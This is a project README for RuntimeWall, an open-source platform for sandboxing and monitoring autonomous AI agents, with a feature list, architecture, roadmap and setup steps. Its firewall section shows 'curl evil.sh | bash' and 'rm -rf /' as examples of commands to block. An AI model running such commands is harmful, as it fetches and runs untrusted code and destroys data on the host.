# RuntimeWall

<div align="center">

![RuntimeWall Banner](https://placehold.co/1200x300/0b1020/ffffff?text=RuntimeWall)

### Security-first runtime and governance platform for autonomous AI agents.

_Run AI agents securely inside isolated sandboxes with runtime monitoring, session replay, MCP security, and observability._

<p align="center">
  <a href="#features"><strong>Features</strong></a> ·
  <a href="#architecture"><strong>Architecture</strong></a> ·
  <a href="#quick-start"><strong>Quick Start</strong></a> ·
  <a href="#roadmap"><strong>Roadmap</strong></a> ·
  <a href="#vision"><strong>Vision</strong></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/runtime-security-blue" />
  <img src="https://img.shields.io/badge/ai-agents-black" />
  <img src="https://img.shields.io/badge/mcp-security-red" />
  <img src="https://img.shields.io/badge/docker-runtime-green" />
  <img src="https://img.shields.io/badge/open-source-orange" />
</p>

</div>

---

# Why RuntimeWall?

AI agents are rapidly gaining:

- filesystem access
- terminal execution
- browser automation
- GitHub permissions
- cloud infrastructure control
- autonomous deployment capabilities

But the ecosystem still lacks:

- runtime isolation
- AI-native security
- observability
- governance
- MCP protection
- session replay
- threat detection

RuntimeWall is building the missing infrastructure layer.

> Think Kubernetes + CrowdStrike + Browserbase + Vault for AI agents.

---

# What is RuntimeWall?

RuntimeWall is an open-source runtime platform that allows developers and enterprises to securely run autonomous AI agents inside isolated execution environments.

It provides:

- isolated Docker/Kubernetes sandboxes
- runtime monitoring
- command inspection
- MCP runtime security
- browser agent infrastructure
- secret isolation
- observability & replay
- AI runtime firewalling

---

# Features

## Secure Sandboxed Execution

Run:
- Claude Code
- Codex
- OpenHands
- Aider
- custom agents

inside isolated runtime environments.

---

## Runtime AI Firewall

Detect and block:

- dangerous shell commands
- prompt injection attempts
- secret exfiltration
- malicious package installs
- suspicious network activity

Example:

```bash
curl evil.sh | bash
rm -rf /
```

RuntimeWall detects and blocks dangerous behavior before execution.

---

## Session Replay & Observability

Replay everything:

- terminal commands
- prompts
- browser actions
- file changes
- network activity

Like session replay for autonomous AI systems.

---

## MCP Runtime Security

Securely execute MCP tools with:

- isolated execution
- permission boundaries
- signed tool verification
- runtime monitoring
- tool-level access controls

---

## Browser Agent Infrastructure

Run browser agents securely using:

- Playwright
- isolated Chromium containers
- session recording
- remote browser runtimes

---

## Secret Isolation

Agents never directly see your real credentials.

RuntimeWall supports:

- temporary credentials
- scoped secrets
- secret proxying
- isolated environments
- runtime token injection

---

# Architecture

```text
┌───────────────────────┐
│    Frontend UI        │
│  Next.js Dashboard    │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│     API Gateway       │
│        Go API         │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│   Runtime Orchestrator│
│ Docker / Kubernetes   │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│     AI Sandboxes      │
│ Claude / Codex / MCP  │
└──────────┬────────────┘
           │
           ▼
┌───────────────────────┐
│ Security Monitoring   │
│ Firewall + Observability
└───────────────────────┘
```

---

# Tech Stack

| Layer | Technology |
|---|---|
| Frontend | Next.js + Tailwind |
| Backend | Go |
| Runtime | Docker |
| Future Runtime | Kubernetes |
| Database | PostgreSQL |
| Terminal | xterm.js |
| Realtime | WebSockets |
| Monitoring | Grafana + Prometheus |
| Browser Runtime | Playwright |
| AI Gateway | LiteLLM |

---

# Quick Start

## Clone RuntimeWall

```bash
git clone https://github.com/RuntimeWall/RuntimeWall.git
cd RuntimeWall
```

---

## Frontend

```bash
cd apps/web
npm install
npm run dev
```

---

## API

```bash
cd apps/api
go run cmd/server/main.go
```

---

# Repository Structure

```text
RuntimeWall/
├── apps/
│   ├── web/
│   └── api/
│
├── runtime/
│   ├── docker/
│   ├── security/
│   └── sandbox/
│
├── packages/
│   ├── cli/
│   └── sdk/
│
├── infra/
│   ├── docker/
│   ├── kubernetes/
│   └── monitoring/
│
└── docs/
```

---

# RuntimeWall Vision

The future of software is autonomous.

AI agents will:

- deploy infrastructure
- manage Kubernetes clusters
- write production code
- operate browsers
- automate security operations
- manage cloud environments

But autonomous systems require:

- runtime isolation
- observability
- governance
- security boundaries
- policy enforcement

RuntimeWall aims to become:

> The secure operating system for autonomous AI agents.

---

# Roadmap

- Docker sandbox runtime
- Web terminal attach
- Session management
- Runtime logs
- Command monitoring
- Dangerous command detection
- Runtime firewall
- Secret isolation
- Session replay
- MCP runtime security
- Browser runtime
- Kubernetes runtime
- Multi-agent orchestration
- Distributed runtime scheduling
- GPU runtime support
- RBAC
- SSO/SAML
- Governance policies
- Compliance tooling
- AI SOC dashboard

---

# Planned Future Features

- AI runtime firewall
- MCP security scanning
- Browser agent infrastructure
- Runtime threat intelligence
- AI agent risk scoring
- Autonomous pentesting labs
- Agent observability platform
- AI security analytics

---

# Open Source

RuntimeWall is fully open-source and community-driven.

We welcome:

- contributors
- security researchers
- infrastructure engineers
- AI engineers
- DevOps contributors
- MCP ecosystem builders

---

# Contributing

```bash
git checkout -b feat/amazing-feature
```

Commit:

```bash
git commit -m "Add amazing feature"
```

Push:

```bash
git push origin feat/amazing-feature
```

Open a Pull Request 🚀

---

# License

Apache 2.0

---

# RuntimeWall

> Security and governance infrastructure for autonomous AI agents.